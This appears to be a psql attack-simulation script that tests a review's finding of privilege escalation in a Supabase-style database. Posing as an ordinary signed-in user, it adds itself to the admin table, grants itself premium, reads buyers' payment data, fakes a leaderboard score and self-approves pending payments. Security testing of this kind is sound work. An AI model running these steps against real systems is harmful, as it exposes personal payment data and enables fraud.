-- ============================================================================
-- ATTACK SIMULATION
-- Plays the role of an ordinary signed-in user holding the public anon key,
-- attempting the privilege-escalation chain from the review.
-- ============================================================================

\set ON_ERROR_STOP 0
\pset pager off

-- Seed two users: the real owner, and an attacker.
insert into auth.users (id, email) values
  ('11111111-1111-1111-1111-111111111111', 'owner@example.com'),
  ('22222222-2222-2222-2222-222222222222', 'attacker@evil.com')
on conflict do nothing;

-- ---- Become the attacker: an ordinary authenticated user -------------------
set role authenticated;
select set_config('request.jwt.claim.sub',  '22222222-2222-2222-2222-222222222222', false);
select set_config('request.jwt.claim.role', 'authenticated', false);
select set_config('request.jwt.claims',     '{"sub":"22222222-2222-2222-2222-222222222222","email":"attacker@evil.com","role":"authenticated"}', false);

\echo ''
\echo '>>> STEP 1: attacker inserts themselves into public.admins'
insert into public.admins (email) values ('attacker@evil.com');

\echo ''
\echo '>>> STEP 2: attacker reads the admin allowlist'
select * from public.admins;

\echo ''
\echo '>>> STEP 3: attacker grants themselves Monarch (t3) premium'
select public.grant_premium('22222222-2222-2222-2222-222222222222'::uuid, 't3', null, 'upi');

\echo ''
\echo '>>> STEP 4: did the attacker get premium?'
select user_id, tier, source from public.premium_entitlements
 where user_id = '22222222-2222-2222-2222-222222222222';

\echo ''
\echo '>>> STEP 5: attacker reads every buyer''s payment data (PII)'
select id, buyer_email, utr, amount_paise from public.payments;

\echo ''
\echo '>>> STEP 6: attacker writes a fake leaderboard score'
insert into public.leaderboard (season, user_id, xp)
values ('current', '22222222-2222-2222-2222-222222222222', 999999999)
on conflict (season, user_id) do update set xp = 999999999;

\echo ''
\echo '>>> STEP 7: attacker self-approves a pending payment'
update public.payments set status = 'approved' where status = 'pending';

reset role;
